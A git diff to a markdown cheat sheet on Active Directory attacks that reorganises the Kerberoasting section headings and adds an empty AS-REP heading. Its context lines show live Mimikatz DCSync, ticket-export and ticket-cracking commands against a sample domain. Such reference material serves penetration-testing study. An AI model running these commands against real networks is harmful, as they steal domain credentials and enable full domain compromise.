@@ -23,7 +23,9 @@ Updating....
   - [Silver Ticket](#silver-ticket)
   - [Skeleton Key](#skeleton-key)
   - [DCSync](#dcsync)
-- [Privilege Escalation - Kerberoast](#privilege-escalation---kerberoast)
+- [Privilege Escalation](#privilege escalation)
+  - [Kerberoast](#kerberoast)
+  - [Targeted Kerberoasting AS REPs](targeted Kerberoasting AS REPs)
 
 ## Pre-requisites
 ### Using PowerView:
@@ -355,7 +357,9 @@ Add-ObjectAcl -TargetDistinguishedName "dc=corporate,dc=corp,dc=local" -Principa
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
-# Privilege Escalation - Kerberoast
+# Privilege Escalation
+
+###Kerberoast
 
 **1. Enumeration with Powerview:**
 ```powershell
@@ -383,3 +387,5 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 # Crack the Service account password
 python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\3-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.corp.corporate.local-CORP.CORPORATE.LOCAL.kirbi
 ```
+
+###Targeted Kerberoasting AS REPs
